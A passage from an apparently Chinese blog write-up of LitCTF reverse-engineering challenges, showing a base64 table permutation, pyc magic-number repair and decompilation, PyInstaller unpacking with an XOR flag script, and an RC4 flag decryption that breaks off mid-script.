class="number">20</span>] = <span class="number">4</span>;</span><br><span class="line">    key[<span class="number">21</span>] = <span class="number">54</span>;</span><br><span class="line">    key[<span class="number">22</span>] = <span class="number">52</span>;</span><br><span class="line">    key[<span class="number">23</span>] = <span class="number">47</span>;</span><br><span class="line">    key[<span class="number">24</span>] = <span class="number">3</span>;</span><br><span class="line">    key[<span class="number">25</span>] = <span class="number">11</span>;</span><br><span class="line">    key[<span class="number">26</span>] = <span class="number">58</span>;</span><br><span class="line">    key[<span class="number">27</span>] = <span class="number">48</span>;</span><br><span class="line">    key[<span class="number">28</span>] = <span class="number">32</span>;</span><br><span class="line">    key[<span class="number">29</span>] = <span class="number">15</span>;</span><br><span class="line">    key[<span class="number">30</span>] = <span class="number">49</span>;</span><br><span class="line">    key[<span class="number">31</span>] = <span class="number">14</span>;</span><br><span class="line">    key[<span class="number">32</span>] = <span class="number">37</span>;</span><br><span class="line">    key[<span class="number">34</span>] = <span class="number">55</span>;</span><br><span class="line">    key[<span class="number">35</span>] = <span class="number">53</span>;</span><br><span class="line">    key[<span class="number">36</span>] = <span class="number">24</span>;</span><br><span class="line">    key[<span class="number">37</span>] = <span class="number">35</span>;</span><br><span class="line">    key[<span class="number">38</span>] = <span class="number">18</span>;</span><br><span class="line">    key[<span class="number">39</span>] = <span class="number">25</span>;</span><br><span class="line">    key[<span class="number">40</span>] = <span class="number">33</span>;</span><br><span class="line">    key[<span class="number">41</span>] = <span class="number">43</span>;</span><br><span class="line">    key[<span class="number">42</span>] = <span class="number">50</span>;</span><br><span class="line">    key[<span class="number">43</span>] = <span class="number">39</span>;</span><br><span class="line">    key[<span class="number">44</span>] = <span class="number">12</span>;</span><br><span class="line">    key[<span class="number">45</span>] = <span class="number">19</span>;</span><br><span class="line">    key[<span class="number">46</span>] = <span class="number">13</span>;</span><br><span class="line">    key[<span class="number">47</span>] = <span class="number">42</span>;</span><br><span class="line">    key[<span class="number">48</span>] = <span class="number">9</span>;</span><br><span class="line">    key[<span class="number">49</span>] = <span class="number">17</span>;</span><br><span class="line">    key[<span class="number">50</span>] = <span class="number">28</span>;</span><br><span class="line">    key[<span class="number">51</span>] = <span class="number">30</span>;</span><br><span class="line">    key[<span class="number">52</span>] = <span class="number">23</span>;</span><br><span class="line">    key[<span class="number">53</span>] = <span class="number">36</span>;</span><br><span class="line">    key[<span class="number">54</span>] = <span class="number">1</span>;</span><br><span class="line">    key[<span class="number">55</span>] = <span class="number">22</span>;</span><br><span class="line">    key[<span class="number">56</span>] = <span class="number">57</span>;</span><br><span class="line">    key[<span class="number">57</span>] = <span class="number">63</span>;</span><br><span class="line">    key[<span class="number">58</span>] = <span class="number">8</span>;</span><br><span class="line">    key[<span class="number">59</span>] = <span class="number">27</span>;</span><br><span class="line">    key[<span class="number">60</span>] = <span class="number">6</span>;</span><br><span class="line">    key[<span class="number">61</span>] = <span class="number">62</span>;</span><br><span class="line">    key[<span class="number">62</span>] = <span class="number">45</span>;</span><br><span class="line">    key[<span class="number">63</span>] = <span class="number">29</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(des, table);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">63</span>; ++j)</span><br><span class="line">            table[j] = des[key[j]];</span><br><span class="line">        <span class="built_in">strcpy</span>(des, table);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> table[<span class="number">65</span>] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">    basechange(table);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, table);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>换表后，表为：gJ1BRjQie&#x2F;FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND</p><p>直接进入basecheck函数拿到加密的字符串即可解密</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>pyc文件直接拿去反编，发现缺少magic number，补齐这个文件的magic number，这个文件版本为3.7，magic number为 42 0D 0D 0A，2.7版本：03 F3 0D 0A</p><p>3.5和3.6版本：33 0D 0D 0A</p><p>补齐之后直接反编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6.exe xxx.pyc &gt; xxx.py</span><br></pre></td></tr></table></figure><p>然后直接在代码中找到flag的数据，直接转换为字符即可</p><h2 id="For-Aiur"><a href="#For-Aiur" class="headerlink" title="For Aiur"></a>For Aiur</h2><p>先用pyinstxtractor解包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py xxx.exe</span><br></pre></td></tr></table></figure><p>得到pyc文件，本地的uncomple6没有反编译出，找了个在线网站编译，得到的py文件里唯一有用的信息就是调用了ch包里的check函数，在前面解的包里的PYZ-00.pyz_extracted文件夹中有ch.pyc文件，反编译，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line"> <span class="number">98</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">107</span>, <span class="number">125</span>, <span class="number">66</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">113</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">70</span>, <span class="number">85</span>, <span class="number">81</span>, </span><br><span class="line"> <span class="number">19</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">87</span>, <span class="number">107</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">64</span>, <span class="number">109</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">90</span>, <span class="number">65</span>, </span><br><span class="line"> <span class="number">64</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">81</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">91</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">94</span>, </span><br><span class="line"> <span class="number">107</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">71</span>]</span><br><span class="line">lis = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">num</span>):</span><br><span class="line">    flag = <span class="string">&#x27;LitCTF&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> num % <span class="number">6</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> num % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> num % <span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">if</span> num % <span class="number">13</span> == <span class="number">11</span>:</span><br><span class="line">                            k = <span class="built_in">str</span>(num)</span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">                                flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k[i % <span class="built_in">len</span>(k)]) ^ enc[i])</span><br><span class="line">                                lis.append(<span class="built_in">ord</span>(k[i % <span class="built_in">len</span>(k)]) ^ enc[i])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                                <span class="keyword">from</span> cv2 <span class="keyword">import</span> imread, imshow, namedWindow, WINDOW_NORMAL, FONT_HERSHEY_SIMPLEX, getTickCount, getTickFrequency, putText, LINE_AA, waitKey, getTextSize, resize, moveWindow, IMREAD_UNCHANGED, destroyAllWindows</span><br><span class="line">                                <span class="keyword">from</span> numpy <span class="keyword">import</span> uint8, zeros</span><br><span class="line">                                img = zeros((<span class="number">200</span>, <span class="number">20000</span>, <span class="number">3</span>), uint8)</span><br><span class="line">                                img.fill(<span class="number">255</span>)</span><br><span class="line">                                text = flag</span><br><span class="line">                                font = FONT_HERSHEY_SIMPLEX</span><br><span class="line">                                pos = (<span class="number">50</span>, <span class="number">120</span>)</span><br><span class="line">                                color = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                                thickness = <span class="number">2</span></span><br><span class="line">                                putText(img, text, pos, font, <span class="number">1</span>, color, thickness, LINE_AA)</span><br><span class="line">                                imshow(<span class="string">&#x27;flag&#x27;</span>, img)</span><br><span class="line">                                waitKey(<span class="number">0</span>)</span><br><span class="line">                                destroyAllWindows()</span><br></pre></td></tr></table></figure><p>直接根据代码写脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc = [</span><br><span class="line"> <span class="number">98</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">107</span>, <span class="number">125</span>, <span class="number">66</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">113</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">70</span>, <span class="number">85</span>, <span class="number">81</span>, </span><br><span class="line"> <span class="number">19</span>, <span class="number">21</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">87</span>, <span class="number">107</span>, <span class="number">127</span>, <span class="number">65</span>, <span class="number">65</span>, <span class="number">64</span>, <span class="number">109</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">90</span>, <span class="number">65</span>, </span><br><span class="line"> <span class="number">64</span>, <span class="number">64</span>, <span class="number">65</span>, <span class="number">81</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">80</span>, <span class="number">91</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">94</span>, </span><br><span class="line"> <span class="number">107</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">71</span>]</span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;LitCTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> num % <span class="number">6</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> num % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> num % <span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">if</span> num % <span class="number">13</span> == <span class="number">11</span>:</span><br><span class="line">                            k = <span class="built_in">str</span>(num)</span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">                                flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k[i % <span class="built_in">len</span>(k)]) ^ enc[i])</span><br><span class="line">                                </span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">    num=num+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="程序和人能跑一个就行"><a href="#程序和人能跑一个就行" class="headerlink" title="程序和人能跑一个就行"></a>程序和人能跑一个就行</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+0h] [ebp-2ACh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-298h]</span></span><br><span class="line">  <span class="type">int</span> *v9; <span class="comment">// [esp+18h] [ebp-294h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-290h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+20h] [ebp-28Ch]</span></span><br><span class="line">  <span class="built_in">int</span> (__cdecl *v12)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>); <span class="comment">// [esp+34h] [ebp-278h]</span></span><br><span class="line">  <span class="type">int</span> *v13; <span class="comment">// [esp+38h] [ebp-274h]</span></span><br><span class="line">  <span class="type">int</span> *v14; <span class="comment">// [esp+3Ch] [ebp-270h]</span></span><br><span class="line">  <span class="type">void</span> *v15; <span class="comment">// [esp+40h] [ebp-26Ch]</span></span><br><span class="line">  <span class="type">int</span> *v16; <span class="comment">// [esp+44h] [ebp-268h]</span></span><br><span class="line">  <span class="type">char</span> Buf1[<span class="number">27</span>]; <span class="comment">// [esp+68h] [ebp-244h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buf2[<span class="number">256</span>]; <span class="comment">// [esp+A0h] [ebp-20Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">268</span>]; <span class="comment">// [esp+1A0h] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+2ACh] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;v10;</span><br><span class="line">  v12 = sub_4752F0;</span><br><span class="line">  v13 = dword_476078;</span><br><span class="line">  v14 = &amp;savedregs;</span><br><span class="line">  v15 = &amp;loc_475B38;</span><br><span class="line">  v16 = &amp;v7;</span><br><span class="line">  <span class="built_in">sub_40A8F0</span>(&amp;v10);</span><br><span class="line">  <span class="built_in">sub_409B80</span>();</span><br><span class="line">  v11 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">sub_472810</span>((<span class="type">int</span>)&amp;dword_47DD80, Buf2);</span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, <span class="string">&quot;litctf&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_4015A0</span>(Buf2, <span class="built_in">strlen</span>(Buf2), Destination, <span class="number">6</span>);</span><br><span class="line">  Buf1[<span class="number">0</span>] = <span class="number">-115</span>;</span><br><span class="line">  Buf1[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">  Buf1[<span class="number">2</span>] = <span class="number">-123</span>;</span><br><span class="line">  Buf1[<span class="number">3</span>] = <span class="number">118</span>;</span><br><span class="line">  Buf1[<span class="number">4</span>] = <span class="number">50</span>;</span><br><span class="line">  Buf1[<span class="number">5</span>] = <span class="number">114</span>;</span><br><span class="line">  Buf1[<span class="number">6</span>] = <span class="number">-73</span>;</span><br><span class="line">  Buf1[<span class="number">7</span>] = <span class="number">64</span>;</span><br><span class="line">  Buf1[<span class="number">8</span>] = <span class="number">-120</span>;</span><br><span class="line">  Buf1[<span class="number">9</span>] = <span class="number">126</span>;</span><br><span class="line">  Buf1[<span class="number">10</span>] = <span class="number">-107</span>;</span><br><span class="line">  Buf1[<span class="number">11</span>] = <span class="number">-18</span>;</span><br><span class="line">  Buf1[<span class="number">12</span>] = <span class="number">-59</span>;</span><br><span class="line">  Buf1[<span class="number">13</span>] = <span class="number">-19</span>;</span><br><span class="line">  Buf1[<span class="number">14</span>] = <span class="number">46</span>;</span><br><span class="line">  Buf1[<span class="number">15</span>] = <span class="number">113</span>;</span><br><span class="line">  Buf1[<span class="number">16</span>] = <span class="number">55</span>;</span><br><span class="line">  Buf1[<span class="number">17</span>] = <span class="number">-15</span>;</span><br><span class="line">  Buf1[<span class="number">18</span>] = <span class="number">74</span>;</span><br><span class="line">  Buf1[<span class="number">19</span>] = <span class="number">-103</span>;</span><br><span class="line">  Buf1[<span class="number">20</span>] = <span class="number">53</span>;</span><br><span class="line">  Buf1[<span class="number">21</span>] = <span class="number">24</span>;</span><br><span class="line">  Buf1[<span class="number">22</span>] = <span class="number">-89</span>;</span><br><span class="line">  Buf1[<span class="number">23</span>] = <span class="number">-80</span>;</span><br><span class="line">  Buf1[<span class="number">24</span>] = <span class="number">0</span>;</span><br><span class="line">  Buf1[<span class="number">25</span>] = <span class="number">-106</span>;</span><br><span class="line">  Buf1[<span class="number">26</span>] = <span class="number">-73</span>;</span><br><span class="line">  v8 = <span class="built_in">memcmp</span>(Buf1, Buf2, <span class="number">0x1B</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    v5 = <span class="built_in">sub_471AE0</span>((<span class="type">int</span>)&amp;dword_47DF60, <span class="string">&quot;U are wrong?&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_46FBA0</span>(v5);</span><br><span class="line">    v6 = (_DWORD *)<span class="built_in">sub_474310</span>(<span class="number">4</span>);</span><br><span class="line">    *v6 = Buf2;</span><br><span class="line">    <span class="built_in">sub_475190</span>(v6, &amp;off_483660, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">sub_471AE0</span>((<span class="type">int</span>)&amp;dword_47DF60, <span class="string">&quot;U are right?&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_46FBA0</span>(v3);</span><br><span class="line">  <span class="built_in">sub_40AA70</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个RC4加密，这里的Buf1是假的flag，因为无论如何if语句都会执行，去找真的flag的数据，在sub_475190处设下断点，然后运行，F8把这个函数跳过，往后面找，就可以找到真正的flag数据</p><p><img src="/2023/05/16/LitCTF%E5%A4%8D%E7%8E%B0/1.png"></p><p>前面提到了密钥为litctf，直接写出脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">val=[<span class="number">0x8D</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x85</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x86</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x87</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x8A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x43</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x8B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x8C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x8D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x8E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDE</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFB</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x93</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x94</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC8</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x9A</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x35</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x98</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x99</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x92</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x9D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1B</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x24</span>, <span class="number">0x9F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x88</span>]</span><br><span class="line">vals=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(val),<span class="number">8</span>):</span><br><span class="line">    vals.append(val[i])</span><br><span class="line">vals_b=<span class="built_in">bytes</span>(vals)</span><br><span class="line">key=<span 